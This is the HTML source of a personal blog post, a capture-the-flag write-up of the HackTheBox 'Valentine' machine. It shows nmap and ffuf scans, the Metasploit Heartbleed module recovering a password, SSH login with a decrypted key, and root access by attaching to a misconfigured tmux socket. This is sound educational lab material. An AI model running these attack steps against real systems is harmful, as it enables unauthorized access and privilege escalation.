@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Valentine">
+  <meta property="og:description" content="HackTheBox - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Valentine</title>
+  <meta name="description" content="HackTheBox - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Valentine</b></h1>
+
+<p class="post-metadata text-muted">
+  05 December 2023 -  
+  <b>3 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#heartbleed">
+      <span class="tag badge badge-pill text-primary border border-primary">Heartbleed</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#sshkeyabuse">
+      <span class="tag badge badge-pill text-primary border border-primary">SSHKeyAbuse</span>
+    </a>
+    </p>
+
+<p><img src="/assets/ctf/htb_media/valentine_infocard.png" alt="infocard" /></p>
+
+<h1 id="exploiting-the-valentine-machine-on-hackthebox-a-detailed-walkthrough">Exploiting the Valentine Machine on HackTheBox: A Detailed Walkthrough</h1>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Valentine is an easy machine on HackTheBox that involves exploiting the Heartbleed vulnerability to gain initial access and leveraging a misconfigured tmux session for privilege escalation. This walkthrough will guide you through the process of compromising the Valentine machine, from initial reconnaissance to gaining root access.</p>
+
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> 10.10.10.79 <span class="o">&gt;</span> nmap/service.log
+</code></pre></div></div>
+
+<p><strong>Nmap Results:</strong></p>
+
+<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 08:46 EST
+Nmap scan report for valentine.htb (10.10.10.79)
+Host is up (0.22s latency).
+
+PORT    STATE SERVICE   VERSION
+22/tcp  open  ssh       OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
+|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
+80/tcp  open  http      Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/https Apache/2.2.22 (Ubuntu)
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2018-02-06T00:45:25
+|_Not valid after:  2019-02-06T00:45:25
+|_ssl-date: 2020-12-04T13:49:33+00:00; +1m05s from scanner time.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 1m04s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 121.30 seconds
+</code></pre>
+
+<p><strong>Key Services Identified:</strong></p>
+
+<ul>
+  <li><strong>SSH (22):</strong> OpenSSH 5.9p1</li>
+  <li><strong>HTTP (80):</strong> Apache httpd 2.2.22</li>
+  <li><strong>HTTPS (443):</strong> Apache httpd 2.2.22</li>
+</ul>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the HTTP and HTTPS services on ports 80 and 443 revealed the same image as the homepage.</p>
+
+<p><strong>Webpage:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/valentine_homepage.png" alt="Homepage" /></p>
+
+<p>The homepage is a hint for the Heartbleed vulnerability. We proceeded to exploit this vulnerability using Metasploit.</p>
+
+<h2 id="exploiting-heartbleed">Exploiting Heartbleed</h2>
+
+<h3 id="understanding-heartbleed">Understanding Heartbleed</h3>
+
+<p>Heartbleed is a vulnerability in the OpenSSL cryptographic library, which allows attackers to read sensitive information from the memory of affected servers.</p>
+
+<h3 id="using-metasploit">Using Metasploit</h3>
+
+<p>We used the <code class="language-plaintext highlighter-rouge">auxiliary/scanner/ssl/openssl_heartbleed</code> module in Metasploit to exploit the Heartbleed vulnerability.</p>
+
+<p><strong>Metasploit Module Execution:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use auxiliary/scanner/ssl/openssl_heartbleed
+msf6 auxiliary<span class="o">(</span>scanner/ssl/openssl_heartbleed<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.79
+msf6 auxiliary<span class="o">(</span>scanner/ssl/openssl_heartbleed<span class="o">)</span> <span class="o">&gt;</span> run
+</code></pre></div></div>
+
+<p><strong>Exploit Output:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/valentine_msfoutput.png" alt="Metasploit Output" /></p>
+
+<p>The exploit leaked some base64 strings in memory. Decoding <code class="language-plaintext highlighter-rouge">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code> provided the password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>heartbleedbelievethehype
+</code></pre></div></div>
+
+<h3 id="directory-brute-forcing">Directory Brute-Forcing</h3>
+
+<p>Using <code class="language-plaintext highlighter-rouge">ffuf</code>, we discovered several directories:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://10.10.10.79/FUZZ
+</code></pre></div></div>
+
+<p><strong>Key Directories Identified:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/dev</code></li>
+</ul>
+
+<p><strong>Discovered Files:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/valentine_dev.png" alt="Dev Directory" /></p>
+
+<h2 id="gaining-initial-access">Gaining Initial Access</h2>
+
+<h3 id="extracting-the-ssh-key">Extracting the SSH Key</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">hype_key</code> file contained data in decimal format. Decoding this data revealed an encrypted SSH key.</p>
+
+<p><strong>SSH Key:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/valentine_sshkey.png" alt="SSH Key" /></p>
+
+<h3 id="decrypting-the-ssh-key">Decrypting the SSH Key</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">notes.txt</code> file contained a to-do list, which hinted at the passphrase for the SSH key. Using the passphrase <code class="language-plaintext highlighter-rouge">heartbleedbelievethehype</code>, we decrypted the SSH key and logged into the <code class="language-plaintext highlighter-rouge">hype</code> account.</p>
+
+<p><strong>SSH Access:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> hype_key hype@10.10.10.79
+</code></pre></div></div>
+
+<p><strong>User Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/valentine_user.png" alt="User Shell" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="enumerating-tmux-sessions">Enumerating Tmux Sessions</h3>
+
+<p>Running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> revealed that root had an active tmux session with a socket at <code class="language-plaintext highlighter-rouge">/.devs/dev_sess</code>.</p>
+
+<p><strong>Tmux Socket Permissions:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hype@Valentine:~/Desktop<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /.devs/dev_sess
+srw-rw---- 1 root hype 0 Dec  4 22:45 /.devs/dev_sess
+</code></pre></div></div>
+
+<h3 id="hijacking-the-tmux-session">Hijacking the Tmux Session</h3>
+
+<p>We attached to the root tmux session to gain a root shell.</p>
+
+<p><strong>Attaching Tmux Session:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tmux <span class="nt">-S</span> /.devs/dev_sess
+</code></pre></div></div>
+
+<p><strong>Root Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/valentine_root.png" alt="Root Shell" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The Valentine machine on HackTheBox provided a comprehensive challenge, encompassing web application enumeration, Heartbleed exploitation, and privilege escalation through a misconfigured tmux session. By methodically enumerating services and exploiting discovered vulnerabilities, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.</p>
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:akschavan100@gmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/akshaychavan10"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.linkedin.com/in/akshaychavan07"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#007bb5'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div><small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
